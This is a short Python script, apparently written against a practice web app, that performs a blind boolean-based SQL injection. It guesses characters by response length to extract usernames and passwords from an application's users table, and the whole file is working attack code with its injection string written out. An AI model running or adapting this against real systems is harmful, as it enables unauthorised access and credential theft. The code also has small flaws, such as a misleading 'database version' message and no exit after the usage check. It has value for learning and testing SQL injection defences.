import sys
import re
import requests
from bs4 import BeautifulSoup


def query_sqli(ip, injection_string):
    for j in range(32, 126):
    	#print("j iterationo: ", j)
    	target = "http://%s:3000/sqliblind_boolean_app.php?user=%s" % (ip, injection_string.replace("[CHAR]",str(j)))
    	#print("query target: %s ", target)
    	r = requests.get(target)
    	s = BeautifulSoup(r.text, 'lxml')
    	content_length = int(r.headers['Content-Length'])
    	#print("response content-length : %s ", str(content_length))
    	if content_length > 406:
    		#print("Injection !")
    		return j
    return None
    
def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target> " % sys.argv[0]
        print '(+) eg: %s 127.0.0.1 ' %sys.argv[0]
    ip = sys.argv[1]
    print("Obtaining Database version .....")
    for i in range(1,32):
    	injection_string = "' or (ascii(substring((select concat(name, password) from application.users LIMIT 2,1), %d, 1)))=[CHAR];-- -" % i
    	#print("Injection string : %s", injection_string)
    	value = query_sqli(ip, injection_string)
    	if value  and  value != "":
    		sys.stdout.write(chr(value))
    		sys.stdout.flush()
    print("\nUser and credentials extracted !")

if __name__ == "__main__":
    main()

